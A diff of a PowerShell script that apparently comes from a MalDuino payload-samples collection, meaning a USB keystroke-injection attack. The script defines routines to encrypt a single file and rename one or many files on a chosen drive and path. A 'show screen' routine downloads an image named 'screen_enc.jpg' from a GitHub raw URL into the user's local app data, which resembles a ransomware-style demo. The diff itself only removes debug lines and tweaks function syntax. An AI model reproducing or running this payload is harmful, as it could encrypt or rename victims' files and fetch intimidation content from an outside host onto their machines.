@@ -14,22 +14,18 @@
 # $show_screen = "yes" or "true" will show. any other value will NOT show  
 #
 get-variable | out-string
-sleep 20
-$xxx = -join("file_drive:", $file_drive, "!")
-echo $xxx
 if (-not($file_drive -eq "")) { 
   $file_drive_long = $file_drive+":" 
   Set-Location $file_drive_long
 }
 if (-not($file_path -eq "")) { Set-Location "$file_path" }
-
 if ($type -eq "single_enc") { Do_Single_File_ENC }
 if ($type -eq "multi_ren") { Do_Multiple_Files_REN }
 if ($type -eq "single_ren") { Do_Single_File_REN }
 if ($show_screen.ToUpper() -eq "YES" -Or $show_screen.ToUpper() -eq "TRUE") { Do_Show_Screen }
 
 
-function Do_Single_File_REN {
+function Do_Single_File_REN() {
   if ($file -eq "") { return }    
   $curdir = get-location;  
   $file_full_path = -join($curdir, $file)
@@ -38,7 +34,7 @@ function Do_Single_File_REN {
 }
 
 
-function Do_Multiple_Files_REN {
+function Do_Multiple_Files_REN() {
   if ($file -eq "") { return }    
   $file_count = (gci -Path . -File | where fullname -like "*$file").Count
   if ($file_count -eq "0") { exit }
@@ -46,7 +42,7 @@ function Do_Multiple_Files_REN {
 }
 
 
-function Do_Single_File_ENC {
+function Do_Single_File_ENC() {
   if ($file -eq "") { return }    
   if ($file_drive -eq "") { $file_drive = (get-location).Drive.Name }
   $file_exist = "$file_drive" + ":\" + "$file_enc"
@@ -87,7 +83,7 @@ function Do_Single_File_ENC {
 }
 
 
-function Do_Show_Screen {  
+function Do_Show_Screen() {  
   $screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
   (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg", $screen)
   sleep 10
